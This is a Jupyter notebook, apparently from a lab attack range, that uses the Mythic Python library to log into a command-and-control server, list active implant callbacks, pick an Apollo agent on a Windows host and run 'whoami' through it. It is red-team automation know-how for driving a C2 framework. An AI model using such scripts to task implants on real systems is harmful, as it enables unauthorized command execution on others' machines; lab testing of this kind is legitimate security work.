{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3ed94f58-07bb-4df4-8a49-52595e911a7f",
   "metadata": {},
   "source": [
    "# Mythic API Testing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "1e109cdc-be6c-491c-abc0-516a85bd7a71",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pandas in /opt/conda/lib/python3.11/site-packages (2.2.2)\n",
      "Requirement already satisfied: mythic in /opt/conda/lib/python3.11/site-packages (0.1.8)\n",
      "Requirement already satisfied: numpy>=1.23.2 in /opt/conda/lib/python3.11/site-packages (from pandas) (2.0.0)\n",
      "Requirement already satisfied: python-dateutil>=2.8.2 in /opt/conda/lib/python3.11/site-packages (from pandas) (2.8.2)\n",
      "Requirement already satisfied: pytz>=2020.1 in /opt/conda/lib/python3.11/site-packages (from pandas) (2023.3.post1)\n",
      "Requirement already satisfied: tzdata>=2022.7 in /opt/conda/lib/python3.11/site-packages (from pandas) (2024.1)\n",
      "Requirement already satisfied: aiohttp in /opt/conda/lib/python3.11/site-packages (from mythic) (3.9.5)\n",
      "Requirement already satisfied: asyncio in /opt/conda/lib/python3.11/site-packages (from mythic) (3.4.3)\n",
      "Requirement already satisfied: gql[aiohttp,websockets] in /opt/conda/lib/python3.11/site-packages (from mythic) (3.5.0)\n",
      "Requirement already satisfied: six>=1.5 in /opt/conda/lib/python3.11/site-packages (from python-dateutil>=2.8.2->pandas) (1.16.0)\n",
      "Requirement already satisfied: aiosignal>=1.1.2 in /opt/conda/lib/python3.11/site-packages (from aiohttp->mythic) (1.3.1)\n",
      "Requirement already satisfied: attrs>=17.3.0 in /opt/conda/lib/python3.11/site-packages (from aiohttp->mythic) (23.1.0)\n",
      "Requirement already satisfied: frozenlist>=1.1.1 in /opt/conda/lib/python3.11/site-packages (from aiohttp->mythic) (1.4.1)\n",
      "Requirement already satisfied: multidict<7.0,>=4.5 in /opt/conda/lib/python3.11/site-packages (from aiohttp->mythic) (6.0.5)\n",
      "Requirement already satisfied: yarl<2.0,>=1.0 in /opt/conda/lib/python3.11/site-packages (from aiohttp->mythic) (1.9.4)\n",
      "Requirement already satisfied: graphql-core<3.3,>=3.2 in /opt/conda/lib/python3.11/site-packages (from gql[aiohttp,websockets]->mythic) (3.2.3)\n",
      "Requirement already satisfied: backoff<3.0,>=1.11.1 in /opt/conda/lib/python3.11/site-packages (from gql[aiohttp,websockets]->mythic) (2.2.1)\n",
      "Requirement already satisfied: anyio<5,>=3.0 in /opt/conda/lib/python3.11/site-packages (from gql[aiohttp,websockets]->mythic) (4.0.0)\n",
      "Requirement already satisfied: websockets<12,>=10 in /opt/conda/lib/python3.11/site-packages (from gql[aiohttp,websockets]->mythic) (11.0.3)\n",
      "Requirement already satisfied: idna>=2.8 in /opt/conda/lib/python3.11/site-packages (from anyio<5,>=3.0->gql[aiohttp,websockets]->mythic) (3.4)\n",
      "Requirement already satisfied: sniffio>=1.1 in /opt/conda/lib/python3.11/site-packages (from anyio<5,>=3.0->gql[aiohttp,websockets]->mythic) (1.3.0)\n"
     ]
    }
   ],
   "source": [
    "!pip install pandas mythic\n",
    "from mythic import mythic\n",
    "import pandas as pd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "6a899782-bbc0-4090-b4f0-38160dbf024f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Connected to Mythic!\n"
     ]
    }
   ],
   "source": [
    "mythic_instance = await mythic.login(\n",
    "    username=\"mythic_admin\",\n",
    "    password=\"mythic_password\",\n",
    "    server_ip=\"10.0.1.21\",\n",
    "    server_port=8443,\n",
    "    timeout=-1\n",
    ")\n",
    "if mythic_instance: print(f\"[+] Connected to Mythic!\")\n",
    "\n",
    "target_host = \"AR-WIN-2\"\n",
    "target_agent = \"apollo\"\n",
    "target_domain = \"ATTACKRANGE\"\n",
    "\n",
    "command_name = \"shell\"\n",
    "command_parameters = \"whoami\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f0690628-c62c-4a19-af2b-04681250c0b9",
   "metadata": {},
   "source": [
    "## Listing Agents"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "217509b7-5d88-4e85-b364-06261af0d211",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Found 1 ATTACKRANGE agents\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>architecture</th>\n",
       "      <th>description</th>\n",
       "      <th>domain</th>\n",
       "      <th>external_ip</th>\n",
       "      <th>host</th>\n",
       "      <th>id</th>\n",
       "      <th>display_id</th>\n",
       "      <th>integrity_level</th>\n",
       "      <th>ip</th>\n",
       "      <th>extra_info</th>\n",
       "      <th>sleep_info</th>\n",
       "      <th>pid</th>\n",
       "      <th>os</th>\n",
       "      <th>user</th>\n",
       "      <th>agent_callback_id</th>\n",
       "      <th>operation_id</th>\n",
       "      <th>process_name</th>\n",
       "      <th>payload</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>x64</td>\n",
       "      <td>Created by mythic_admin at 2024-06-22 11:32:45 Z</td>\n",
       "      <td>ATTACKRANGE</td>\n",
       "      <td></td>\n",
       "      <td>AR-WIN-2</td>\n",
       "      <td>2</td>\n",
       "      <td>2</td>\n",
       "      <td>3</td>\n",
       "      <td>[\"10.0.1.15\"]</td>\n",
       "      <td></td>\n",
       "      <td></td>\n",
       "      <td>4060</td>\n",
       "      <td>Windows Server 2019 Datacenter 1809 6.2.9200.0</td>\n",
       "      <td>Administrator</td>\n",
       "      <td>f7fd5569-aec4-4533-826f-308fd26f21d0</td>\n",
       "      <td>1</td>\n",
       "      <td>agpt</td>\n",
       "      <td>{'os': 'Windows', 'payloadtype': {'name': 'apo...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "  architecture                                       description       domain  \\\n",
       "0          x64  Created by mythic_admin at 2024-06-22 11:32:45 Z  ATTACKRANGE   \n",
       "\n",
       "  external_ip      host  id  display_id  integrity_level             ip  \\\n",
       "0              AR-WIN-2   2           2                3  [\"10.0.1.15\"]   \n",
       "\n",
       "  extra_info sleep_info   pid                                              os  \\\n",
       "0                        4060  Windows Server 2019 Datacenter 1809 6.2.9200.0   \n",
       "\n",
       "            user                     agent_callback_id  operation_id  \\\n",
       "0  Administrator  f7fd5569-aec4-4533-826f-308fd26f21d0             1   \n",
       "\n",
       "  process_name                                            payload  \n",
       "0         agpt  {'os': 'Windows', 'payloadtype': {'name': 'apo...  "
      ]
     },
     "execution_count": 38,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "callbacks = await mythic.get_all_active_callbacks(mythic=mythic_instance)\n",
    "attack_range_agents = [c for c in callbacks if c['domain'].upper() == target_domain.upper()]\n",
    "print(f\"[+] Found {len(attack_range_agents)} {target_domain} agents\")\n",
    "pd.DataFrame(callbacks)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "1859a8c5-017c-4d92-8c54-4f76a138c269",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Found {target_host} agent with Callback Display ID: 2\n"
     ]
    }
   ],
   "source": [
    "hosts = [c for c in attack_range_agents \\\n",
    "    if c['host'].upper() == target_host.upper() and \\\n",
    "    c['payload']['payloadtype']['name']== target_agent\n",
    "]\n",
    "if not hosts:\n",
    "    raise Exception(f\"[-] Could not find {target_host} agent\")\n",
    "\n",
    "agent_id = hosts[0]['display_id']\n",
    "print(f\"[+] Found {{target_host}} agent with Callback Display ID: {agent_id}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "36cba460-8ef9-460d-81ff-ae018acdd17c",
   "metadata": {},
   "source": [
    "## Executing a Command"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "1f60458b-61bb-4a12-baa7-beb606d4da8e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[+] Command output:\n",
      "attackrange\\administrator\n",
      "\n"
     ]
    }
   ],
   "source": [
    "output = await mythic.issue_task_and_waitfor_task_output(\n",
    "    mythic=mythic_instance,\n",
    "    command_name=command_name,\n",
    "    parameters=command_parameters,\n",
    "    callback_display_id=agent_id,\n",
    "    timeout=60,\n",
    ")\n",
    "print(f\"[+] Command output:\\n{output.decode()}\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
